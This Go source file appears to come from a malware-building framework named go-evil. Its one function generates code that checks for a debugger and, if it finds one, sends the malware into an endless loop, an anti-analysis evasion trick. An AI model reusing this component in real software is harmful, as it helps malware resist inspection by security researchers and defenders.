package debugger

import (
	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
)

// Generates the code which will cause the malware to enter an infinite loop
func loop_behavior(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{
		"toReturn := false",
		"toReturn = detect_debugger()",
		"if toReturn {",
		"for {",
		"}",
		"}",
		"return toReturn",
	}

	data_object.Add_go_function(functions.Go_func_t{Name: "loop_behavior", Func_type: "null", Return_type: "bool", Gut: body})

	return structure.Send(data_object)
}
